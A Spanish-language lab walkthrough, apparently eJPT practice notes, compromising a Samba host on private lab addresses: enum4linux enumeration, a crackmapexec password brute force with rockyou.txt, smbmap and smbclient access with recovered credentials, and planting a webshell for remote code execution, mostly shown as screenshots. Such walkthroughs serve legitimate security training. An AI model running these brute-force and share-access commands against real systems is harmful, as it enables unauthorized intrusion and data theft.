- --
- Tags: #ejptmachine #samba #rce 
---

![Pasted image 20250222210405](../../Fotos/Pasted%20image%2020250222210405.png)

![Pasted image 20250222210428](../../Fotos/Pasted%20image%2020250222210428.png)

![Pasted image 20250222210548](../../Fotos/Pasted%20image%2020250222210548.png)

![Pasted image 20250222210556](../../Fotos/Pasted%20image%2020250222210556.png)

![Pasted image 20250222210611](../../Fotos/Pasted%20image%2020250222210611.png)

`enum4linux -a 172.17.0.2`

![Pasted image 20250222211035](../../Fotos/Pasted%20image%2020250222211035.png)

- ubuntu / usuario1 / usuario2 / usuario3 / *satriani7 (interesante)* / administrador


`crackmapexec smb 172.17.0.3 -u satriani7 -p /usr/share/wordlists/rockyou.txt`

![Pasted image 20250222211405](../../Fotos/Pasted%20image%2020250222211405.png)

- satriani7 : 50cent

`smbmap -H 172.17.0.3 -u "satriani7" -p "50cent"`

![Pasted image 20250222211452](../../Fotos/Pasted%20image%2020250222211452.png)

`smbmap -H 172.17.0.3 -u "satriani7" -p "50cent" -r backup24/documents/personal`

![Pasted image 20250222211605](../../Fotos/Pasted%20image%2020250222211605.png)

Descargamos estos archivos

![Pasted image 20250222214205](../../Fotos/Pasted%20image%2020250222214205.png)

![Pasted image 20250222214229](../../Fotos/Pasted%20image%2020250222214229.png)

![Pasted image 20250222214240](../../Fotos/Pasted%20image%2020250222214240.png)

![Pasted image 20250222214323](../../Fotos/Pasted%20image%2020250222214323.png)

`smbclient //172.17.0.3/home/ -U administrador%Adm1nP4ss2024`

![Pasted image 20250222214535](../../Fotos/Pasted%20image%2020250222214535.png)

*Es lo mismo que vimos en gobuster por lo que aquí podemos plantar la RCE*

![Pasted image 20250222210548](../../Fotos/Pasted%20image%2020250222210548.png)

En nuestra maquina creamos un script de una webshell o la buscamos 

![Pasted image 20250222215056](../../Fotos/Pasted%20image%2020250222215056.png)

![Pasted image 20250222215135](../../Fotos/Pasted%20image%2020250222215135.png)

![Pasted image 20250222215156](../../Fotos/Pasted%20image%2020250222215156.png)

![Pasted image 20250222220204](../../Fotos/Pasted%20image%2020250222220204.png)

![Pasted image 20250222220310](../../Fotos/Pasted%20image%2020250222220310.png)

![Pasted image 20250222220424](../../Fotos/Pasted%20image%2020250222220424.png)

